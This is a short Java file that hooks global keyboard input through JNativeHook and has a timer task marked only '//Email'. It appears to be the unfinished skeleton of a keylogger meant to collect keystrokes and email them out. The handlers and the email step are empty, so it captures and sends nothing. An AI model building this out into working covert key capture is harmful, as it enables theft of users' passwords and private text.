import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.IOException;
import java.lang.annotation.Native;
import java.util.LinkedList;
import java.util.Timer;
import java.util.TimerTask;

public class program implements NativeKeyListener {

    private LinkedList<String> keypressList = new LinkedList<String>();
    private String keyPresses;

    public static void main(String[]args) {

        //Initiate Native Keylistener

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new program());

        //Initiate timer
        Timer timer = new Timer();
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                //Email

            }
        };
        timer.schedule(task, 3000000);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {

    }
}
